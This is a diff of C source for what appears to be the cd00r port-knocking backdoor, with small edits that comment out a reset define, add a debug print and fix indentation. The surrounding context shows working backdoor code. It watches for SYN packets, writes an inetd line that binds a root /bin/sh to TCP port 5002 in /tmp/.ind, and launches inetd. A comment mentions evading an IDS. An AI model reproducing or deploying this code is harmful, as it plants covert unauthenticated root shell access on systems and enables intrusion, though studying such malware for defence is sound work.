@@ -132,7 +132,8 @@
  * 
  * To use resets, define CDR_CODERESET 
  */
-#define CDR_CODERESET
+
+//#define CDR_CODERESET
 
 /* If you like to open the door from different addresses (e.g. to
  * confuse an IDS), don't define this.
@@ -249,6 +250,10 @@ void cdr_open_door(void) {
     if ((f=fopen("/tmp/.ind","a+t"))==NULL) return;
     fprintf(f,"5002  stream  tcp     nowait  root    /bin/sh  sh\n");
     fclose(f);
+
+#ifdef DEBUG
+    printf("inetd running on process %d\n", getpid());
+#endif DEBUG
 
     execv("/usr/sbin/inetd",args); // will execute inetd program
 #ifdef DEBUG
@@ -466,7 +471,7 @@ int main (int argc, char **argv) {
 	/* if it isn't a SYN packet, continue */
 	if (!(ntohs(tcp->rawflags)&0x02)) continue;
 	/* if it is a SYN-ACK packet, continue */
-	if (ntohs(tcp->rawflags)&0x10) continue;
+    if (ntohs(tcp->rawflags)&0x10) continue;
     // ^^ because we are only listening for SYN messages from specified ports
 
 #ifdef CDR_ADDRESS
